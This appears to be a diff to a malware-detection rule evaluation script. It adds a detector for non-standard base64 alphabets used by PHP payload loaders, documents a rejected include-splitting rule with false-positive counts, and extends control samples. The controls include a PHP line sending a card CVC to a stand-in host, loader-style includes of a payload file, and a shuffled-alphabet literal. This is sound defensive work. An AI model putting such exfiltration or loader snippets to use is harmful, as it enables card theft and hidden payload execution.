@@ -133,6 +133,56 @@ _FORM = re.compile(rb"<form", re.I)
 _CARDFIELD = re.compile(
     rb"name\s*=\s*[\"'][^\"']*(card|ccnum|cc_num|cvv|cvc|expir|ssn)", re.I)
 
+# A base64 alphabet written down in a non-standard order.
+#
+# `_B64_SET64` is the 64 characters an implementation needs; the pad is optional, and both
+# forms occur in the wild, so both are read. A literal holding each of them exactly once IS
+# an alphabet. The standard orderings are the only ones that decode base64, so a permutation
+# that is not one of them is a substitution table rather than an implementation.
+#
+# The at-risk predicate deliberately ADMITS the standard orderings. That is the whole design:
+# the near-miss population and the hit population are then the same files, so the count below
+# is a discrimination rather than a filter that never met a hard case. Measured over the three
+# benign trees, 317 alphabet literals occur and every one is in standard order.
+_B64_STD64 = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+_B64_STD65 = _B64_STD64 + b"="
+_B64_SET64 = frozenset(_B64_STD64)
+_B64_SET65 = frozenset(_B64_STD65)
+_B64_RUN = re.compile(rb"""["']([A-Za-z0-9+/=]{64,65})["']""")
+
+
+def _b64_alphabets(blob: bytes):
+    """Every quoted 64- or 65-byte literal that holds each base64 character exactly once."""
+    for m in _B64_RUN.finditer(blob):
+        lit = m.group(1)
+        if len(lit) == 65 and frozenset(lit) == _B64_SET65:
+            yield lit
+        elif len(lit) == 64 and frozenset(lit) == _B64_SET64:
+            yield lit
+
+
+def _shuffled_b64_alphabet(blob: bytes) -> bool:
+    return any(lit not in (_B64_STD64, _B64_STD65) for lit in _b64_alphabets(blob))
+
+
+# An include/require whose PATH is spliced from two adjacent string literals.
+#
+# MEASURED AND REJECTED. The argument for it was that the discriminator should be the SPLIT
+# rather than the included file's extension: keying on `.txt` was rejected in an earlier
+# round at 124 false positives (`REJECTED:include-of-txt`, still measured beside this one so
+# the contrast is one report rather than two), and a filename cut between two literals is not
+# a filename an author typed. That argument was wrong, and only the measurement says so: the
+# split costs 422 false positives over the same three trees - 1.44% of the 29,342 at-risk
+# files, and THREE TIMES the candidate it was meant to improve on - to reach 5 samples.
+# Splicing a path across literals is ordinary in Magento and in requirejs. Kept here so the
+# rejection stays reproducible rather than being re-derived and re-argued next round.
+_INC_SPLIT = re.compile(
+    rb"""(?:include|require)(?:_once)?\b[^;]{0,200}?"""
+    rb"""(?:"[^"]*"|'[^']*')\s*\.\s*(?:"[^"]*"|'[^']*')""",
+    re.I | re.X)
+_INC_ANY = re.compile(rb"(?:include|require)(?:_once)?\b", re.I)
+
+
 CANDIDATES = {
     # --- recommended -------------------------------------------------------------------
     "seo-triple": dict(
@@ -173,9 +223,23 @@ CANDIDATES = {
         at_risk=lambda b, n: bool(_CVC.search(b)),
         match=lambda b, n: bool(_CVC.search(b) and _SINK.search(b) and _POST.search(b)),
     ),
+    "shuffled-base64-alphabet": dict(
+        blurb="a 64/65-char base64 alphabet literal written in a non-standard order",
+        family="fake-plugin-image-payload-loader (5 .txt second stages) - shipped as OBF042",
+        at_risk=lambda b, n: any(True for _ in _b64_alphabets(b)),
+        match=lambda b, n: _shuffled_b64_alphabet(b),
+    ),
     # --- measured and rejected; kept so the rejection stays reproducible ---------------
+    "REJECTED:split-literal-include": dict(
+        blurb="include/require with a path spliced from two adjacent literals "
+              "(rejected: 422 FPs for 5 samples - WORSE than the extension it replaced)",
+        family="fake-plugin loader half",
+        at_risk=lambda b, n: n.lower().endswith(CODE_EXT) and bool(_INC_ANY.search(b)),
+        match=lambda b, n: bool(_INC_SPLIT.search(b)),
+    ),
     "REJECTED:include-of-txt": dict(
-        blurb="include/require of a .txt file (rejected: 101 FPs for 2 samples)",
+        blurb="include/require of a .txt file (rejected: 101 FPs for 2 samples; "
+              "re-measured 2026-09-08 over the same three trees: 124)",
         family="fake-plugin loader half",
         at_risk=lambda b, n: n.lower().endswith(CODE_EXT),
         match=lambda b, n: bool(_INC_TXT.search(b)),
@@ -279,6 +343,11 @@ CONTROLS = {
     "card-data-to-remote-sink": ("ctl.php",
                                  b"<?php $c = $_POST['card-cvc'];\n"
                                  b"file_get_contents('http://example.invalid/?d=' . $c);\n"),
+    "REJECTED:split-literal-include": ("ctl.php",
+                                      b"<?php include_once __DIR__ . \"/pay\" . \"load.txt\";\n"),
+    "shuffled-base64-alphabet": ("ctl.php",
+                                 b"<?php $a = \"ScsP2Yyn3fOWeZCrDQwJHmEuA4KiVhkBUa1tb9MX"
+                                 b"8pF/=GxRz6+qvoLlN0jg75ITd\";\n"),
     "REJECTED:include-of-txt": ("ctl.php", b"<?php include_once __DIR__ . '/payload.txt';\n"),
     "REJECTED:embedded-phpmailer": ("ctl.php", b"<?php class PHPMailer {}\n"),
     "REJECTED:form-with-card-field": ("ctl.html",
